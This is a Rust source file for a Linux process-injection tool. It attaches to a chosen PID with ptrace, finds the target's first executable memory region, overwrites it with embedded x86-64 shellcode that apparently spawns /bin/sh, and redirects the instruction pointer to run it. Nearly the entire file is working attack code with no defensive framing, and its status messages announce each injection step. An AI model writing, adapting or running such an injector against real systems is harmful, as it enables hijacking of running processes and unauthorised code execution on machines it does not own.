use libc::{ptrace, PTRACE_ATTACH, PTRACE_CONT, PTRACE_GETREGS, PTRACE_POKETEXT, PTRACE_SETREGS};
use std::process::exit;

fn main() {
    let shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05\x00\x72\x00\x2f\x70";
    let payload_size = shellcode.len();

    let args: Vec<String> = std::env::args().collect();

    let pid = args
        .get(1)
        .unwrap_or_else(|| {
            eprintln!("Usage: {} <PID>", args[0]);
            exit(1);
        })
        .parse::<i32>()
        .unwrap_or_else(|e| {
            eprintln!("ERROR: {e}");
            exit(1);
        });

    // dbg!(&pid);
    const BLUE: &str = "\x1b[34m";
    const RESET: &str = "\x1b[00m";

    println!("[{BLUE}*{RESET}] Attaching to the process with PID: {pid}");

    unsafe {
        if ptrace(PTRACE_ATTACH, pid) != 0 {
            eprintln!("ERROR: Could not attach to the process, root privileges requied");
            exit(1);
        };
        libc::waitpid(pid, std::ptr::null_mut(), 0);
    }

    let proc_maps = std::fs::read_to_string(format!("/proc/{pid}/maps")).unwrap_or_else(|e| {
        eprintln!("ERROR: proc/maps file could not be read: {e}");
        exit(1);
    });

    // dbg!(&proc_maps);

    let mut mem_addr = "";
    for line in proc_maps.lines() {
        let perms = line.split(' ').nth(1).unwrap();
        if perms.contains('x') {
            mem_addr = line.split('-').next().unwrap();
            break;
        }
    }

    // dbg!(&mem_addr);

    let mem_ptr = usize::from_str_radix(mem_addr, 16).unwrap() as *const u8;

    println!("[{BLUE}*{RESET}] Found section mapped with r-xp permissions");

    let mut regs: libc::user_regs_struct = unsafe { std::mem::zeroed() };
    unsafe {
        if ptrace(
            PTRACE_GETREGS,
            pid,
            // std::ptr::null_mut::<libc::user_regs_struct>(),
            0,
            &mut regs,
        ) != 0
        {
            eprintln!("ERROR: Failed to PTRACE_GETREGS");
            exit(1);
        }
    }

    println!("[{BLUE}*{RESET}] Injecting payload at address 0x{mem_addr}");

    for i in (0..payload_size).step_by(8) {
        let mut shellcode_data: [u8; 8] = [0; 8];
        shellcode_data.copy_from_slice(&shellcode[i..i + 8]);
        if unsafe { ptrace(PTRACE_POKETEXT, pid, mem_ptr as usize + i, shellcode_data) } != 0 {
            eprintln!("ERROR: Failed to PTRACE_POKETEXT");
            exit(1);
        }
    }

    regs.rip = mem_ptr as u64;

    if unsafe {
        ptrace(
            PTRACE_SETREGS,
            pid,
            // std::ptr::null_mut::<libc::user_regs_struct>(),
            0,
            &regs as *const _ as *const libc::c_void,
        )
    } != 0
    {
        eprintln!("ERROR: Failed to PTRACE_SETREGS");
        exit(1);
    }

    println!("[{BLUE}*{RESET}] Jumping to the injected code");

    if unsafe { ptrace(PTRACE_CONT, pid, 0, 0) } != 0 {
        eprintln!("ERROR: Failed to PTRACE_CONT");
        exit(1);
    }

    println!("[{BLUE}*{RESET}] Succesfully injeced and jumped to the code");
}
